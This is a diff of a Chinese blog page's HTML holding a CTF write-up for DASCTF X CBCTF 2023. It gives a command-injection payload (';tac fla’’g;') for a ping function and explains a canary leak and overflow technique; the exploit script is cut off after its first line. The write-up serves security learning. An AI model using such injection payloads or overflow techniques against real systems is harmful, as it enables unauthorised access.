@@ -1,685 +1,1526 @@
-<!DOCTYPE html>
+<!DOCTYPE HTML>
 <html lang="zh-CN">
+
+
 <head><!-- hexo injector head_begin start -->
 <link rel="stylesheet" href="/css/bilicard.css">
 <!-- hexo injector head_begin end -->
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
-<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="DASCTF X CBCTF 2023 WP, ctf,pwn">
+    <meta name="description" content="DASCTF X CBCTF 2023 WP
+PWNEASYBOX这题一开始通过CAT函数读出canary.txt，然后找溢出点找了两小时😅
+最后发现直接就是个web题，在PING函数里面执行system函数命令
 
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="https://github.com/lmarch2/images/blob/main/typora/202307282109602.jpg?raw=true">
-  <link rel="icon" type="image/png" sizes="16x16" href="https://github.com/lmarch2/images/blob/main/typora/202307282109602.jpg?raw=true">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+;tac fla’’g">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
 
-<link rel="stylesheet" href="/css/main.css">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-HT28JN1VDR"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
 
-
-
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/green/pace-theme-minimal.css">
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"lmarch2.github.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.14.1","exturl":false,"sidebar":{"position":"left","width":350,"display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
-
-    <meta name="description" content="DASCTF X CBCTF 2023 WP PWNEASYBOX这题一开始通过CAT函数读出canary.txt，然后找溢出点找了两小时😅 最后发现直接就是个web题，在PING函数里面执行system函数命令">
-<meta property="og:type" content="article">
-<meta property="og:title" content="DASCTF X CBCTF 2023 WP">
-<meta property="og:url" content="http://lmarch2.github.com/posts/ec1aa757/index.html">
-<meta property="og:site_name" content="lmarch2&#39;blog">
-<meta property="og:description" content="DASCTF X CBCTF 2023 WP PWNEASYBOX这题一开始通过CAT函数读出canary.txt，然后找溢出点找了两小时😅 最后发现直接就是个web题，在PING函数里面执行system函数命令">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310221106000.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310272057437.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310211839964.png">
-<meta property="article:published_time" content="2023-10-27T12:56:45.000Z">
-<meta property="article:modified_time" content="2023-10-27T12:58:38.892Z">
-<meta property="article:author" content="lmarch2">
-<meta property="article:tag" content="ctf">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310221106000.png">
+    gtag('js', new Date());
+    gtag('config', 'G-HT28JN1VDR');
+</script>
 
 
-<link rel="canonical" href="http://lmarch2.github.com/posts/ec1aa757/">
+    <title>DASCTF X CBCTF 2023 WP | lmarch2&#39;blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://lmarch2.github.com/posts/ec1aa757/","path":"posts/ec1aa757/","title":"DASCTF X CBCTF 2023 WP"}</script>
-
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>DASCTF X CBCTF 2023 WP | lmarch2'blog</title>
-  
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
 
 
 
 
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
 
 
 
-<link rel="dns-prefetch" href="https://waline-blog-flax-two.vercel.app">
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 <link rel="alternate" href="/atom.xml" title="lmarch2'blog" type="application/atom+xml">
-</head>
+<link rel="stylesheet" href="/css/prism-dracula.css" type="text/css"></head>
 
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
 
-  <main class="main">
-    <div class="column">
-      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">lmarch2&#39;blog</span>
+                </a>
+            </div>
+            
 
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <p class="site-title">lmarch2'blog</p>
-      <i class="logo-line"></i>
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
     </a>
-      <p class="site-subtitle" itemprop="description">求知若渴，虚心若愚</p>
-  </div>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
 
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger" aria-label="搜索" role="button">
-        <i class="fa fa-search fa-fw fa-lg"></i>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">lmarch2&#39;blog</div>
+        <div class="logo-desc">
+            
+            A Student studying Cybersecurity
+            
+        </div>
     </div>
-  </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/lmarch2" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
 </div>
 
 
+        </div>
 
-<nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-</nav>
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
 
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
 
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
 
-  <div class="search-pop-overlay">
-    <div class="popup search-popup"><div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="搜索..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close" role="button">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div class="search-result-container no-result">
-  <div class="search-result-icon">
-    <i class="fa fa-spinner fa-pulse fa-5x"></i>
-  </div>
-</div>
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
 
-    </div>
-  </div>
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/lmarch2" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
 
 </header>
-        
-  
-  <aside class="sidebar">
-
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dasctf-x-cbctf-2023-wp"><span class="nav-text">DASCTF X CBCTF 2023 WP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#easybox"><span class="nav-text">EASYBOX</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#guestbook"><span class="nav-text">GuestBook</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#rsa"><span class="nav-text">RSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cb-backpack"><span class="nav-text">CB backpack</span></a></li></ol></li></ol></div>
-        </div>
-        <!--/noindex-->
-
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="lmarch2"
-      src="https://github.com/lmarch2/images/blob/main/typora/202307282109602.jpg?raw=true">
-  <p class="site-author-name" itemprop="name">lmarch2</p>
-  <div class="site-description" itemprop="description">A Student studying Cybersecurity</div>
-</div>
-<div class="site-state-wrap animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">33</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-          <a href="/categories/">
-        <span class="site-state-item-count">6</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">7</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author animated">
-      <span class="links-of-author-item">
-        <a href="https://github.com/lmarch2" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lmarch2" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="https://www.bilibili.com/" title="Bilibili → https:&#x2F;&#x2F;www.bilibili.com" rel="noopener me" target="_blank"><i class="fab fa-bilibili fa-fw"></i>Bilibili</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="https://www.zhihu.com/" title="Zhihu → https:&#x2F;&#x2F;www.zhihu.com" rel="noopener me" target="_blank"><i class="fab fa-zhihu fa-fw"></i>Zhihu</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="https://www.csdn.net/?spm=1001.2101.3001.4476" title="CSDN → https:&#x2F;&#x2F;www.csdn.net&#x2F;?spm&#x3D;1001.2101.3001.4476" rel="noopener me" target="_blank"><i class="fab fa-CSDN fa-fw"></i>CSDN</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="https://www.cnblogs.com/imarch22/" title="Bokeyuan → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;imarch22&#x2F;" rel="noopener me" target="_blank">Bokeyuan</a>
-      </span>
-  </div>
-  <div class="cc-license animated" itemprop="license">
-    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
-  </div>
-<!-- recent posts -->
-    <div class="links-of-blogroll motion-element links-of-blogroll-block">
-        <div class="links-of-blogroll-title recent-posts-title">
-        <i class="fa fa-history " aria-hidden="true"></i>
-            近期文章
-    </div>
-    <ul class="links-of-blogroll-list recent-posts-list">
-            <li class="my-links-of-blogroll-item">
-            <a href="/posts/19b7e153/" title="HASHTEAM强网杯2024wp" target="">
-            HASHTEAM强网杯2024wp
-            </a>
-        </li>
-            <li class="my-links-of-blogroll-item">
-            <a href="/posts/d8c86fdf/" title="HASHTEAM-n1ctf-2023-WP" target="">
-            HASHTEAM-n1ctf-2023-WP
-            </a>
-        </li>
-            <li class="my-links-of-blogroll-item">
-            <a href="/posts/2611e12a/" title="HASHTEAM香山杯WP" target="">
-            HASHTEAM香山杯WP
-            </a>
-        </li>
-            <li class="my-links-of-blogroll-item">
-            <a href="/posts/ec1aa757/" title="DASCTF X CBCTF 2023 WP" target="">
-            DASCTF X CBCTF 2023 WP
-            </a>
-        </li>
-            <li class="my-links-of-blogroll-item">
-            <a href="/posts/4b18615c/" title="NSSCTF 2nd wp" target="">
-            NSSCTF 2nd wp
-            </a>
-        </li>
-    </ul>
-    </div>
-        </div>
-      </div>
-        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=450 src="//music.163.com/outchain/player?type=0&id=9232910433&auto=1&height=430"></iframe>
-    </div>
 
     
-    <div class="links-of-blogroll motion-element links-of-blogroll-block">
-      <div class="links-of-blogroll-title">
-        <!-- modify icon to fire by szw -->
-        <i class="fa fa-history fa-" aria-hidden="true"></i>
-        近期文章
-      </div>
-      <ul class="links-of-blogroll-list">
-        
-        
-          <li>
-            <a href="/" title="" target="_blank"></a>
-          </li>
-        
-          <li>
-            <a href="/" title="" target="_blank"></a>
-          </li>
-        
-          <li>
-            <a href="/" title="" target="_blank"></a>
-          </li>
-        
-          <li>
-            <a href="/" title="" target="_blank"></a>
-          </li>
-        
-          <li>
-            <a href="/" title="" target="_blank"></a>
-          </li>
-        
-      </ul>
-    </div>
 
-        <div class="pjax">
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">DASCTF X CBCTF 2023 WP</h1>
+                </div>
+            </div>
         </div>
-  </aside>
-
-
     </div>
-
-    <div class="main-inner post posts-expand">
-
-
-  
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://lmarch2.github.com/posts/ec1aa757/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/lmarch2/images/blob/main/typora/202307282109602.jpg?raw=true">
-      <meta itemprop="name" content="lmarch2">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lmarch2'blog">
-      <meta itemprop="description" content="A Student studying Cybersecurity">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="DASCTF X CBCTF 2023 WP | lmarch2'blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          DASCTF X CBCTF 2023 WP
-        </h1>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2023-10-27 20:56:45 / 修改时间：20:58:38" itemprop="dateCreated datePublished" datetime="2023-10-27T20:56:45+08:00">2023-10-27</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span id="busuanzi_value_page_pv"></span>
-    </span>
-  
-  <span class="post-meta-item">
-    
-    <span class="post-meta-item-icon">
-      <i class="far fa-comment"></i>
-    </span>
-    <span class="post-meta-item-text">Waline：</span>
-  
-    <a title="waline" href="/posts/ec1aa757/#waline" itemprop="discussionUrl">
-      <span class="post-comments-count waline-comment-count" data-path="/posts/ec1aa757/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>4.5k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>4 分钟</span>
-    </span>
 </div>
 
-        </div>
-      </header>
+
+
+
+<main class="post-container content">
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-        <h1 id="dasctf-x-cbctf-2023-wp"><a href="#DASCTF-X-CBCTF-2023-WP" class="headerlink" title="DASCTF X CBCTF 2023 WP"></a>DASCTF X CBCTF 2023 WP</h1><p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310221106000.png" alt="image-20231022110621972"></p>
-<h1 id="pwn"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="easybox"><a href="#EASYBOX" class="headerlink" title="EASYBOX"></a>EASYBOX</h2><p>这题一开始通过CAT函数读出canary.txt，然后找溢出点找了两小时😅</p>
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ctf/">
+                                <span class="chip bg-color">ctf</span>
+                            </a>
+                        
+                            <a href="/tags/DASCTF/">
+                                <span class="chip bg-color">DASCTF</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/wp/" class="post-category">
+                                wp
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-10-27
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    536
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    2 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="DASCTF-X-CBCTF-2023-WP"><a href="#DASCTF-X-CBCTF-2023-WP" class="headerlink" title="DASCTF X CBCTF 2023 WP"></a>DASCTF X CBCTF 2023 WP</h1><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310221106000.png" alt="image-20231022110621972"></p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="EASYBOX"><a href="#EASYBOX" class="headerlink" title="EASYBOX"></a>EASYBOX</h2><p>这题一开始通过CAT函数读出canary.txt，然后找溢出点找了两小时😅</p>
 <p>最后发现直接就是个web题，在PING函数里面执行system函数命令</p>
-<span id="more"></span>
-
 <blockquote>
 <p>;tac fla’’g;</p>
 </blockquote>
-<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310272057437.png" alt="image-20231021182601723"></p>
-<h2 id="guestbook"><a href="#GuestBook" class="headerlink" title="GuestBook"></a>GuestBook</h2><p>输入name的时候有溢出，可以覆盖一个字节泄露canary，</p>
+<p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310272057437.png" alt="image-20231021182601723"></p>
+<p>还有一种解法是</p>
+<h2 id="GuestBook"><a href="#GuestBook" class="headerlink" title="GuestBook"></a>GuestBook</h2><p>输入name的时候有溢出，可以覆盖一个字节泄露canary，</p>
 <p>接着在strcpy中有溢出，直接传payload，被strcpy遇b’\x00’截断这个问题卡住了（遇零截断意味着无法传输字符\x00，然而canary以\x00结尾）</p>
 <p>调试解决发现在  __isoc99_scanf(“%s”, message);输入字符串的时候会在后面补零</p>
 <p>于是可以通过多次输入先输入覆盖返回地址和canary除去\x00的七个字符，再给canary补上\x00</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Excalibur <span class="keyword">import</span>*</span><br><span 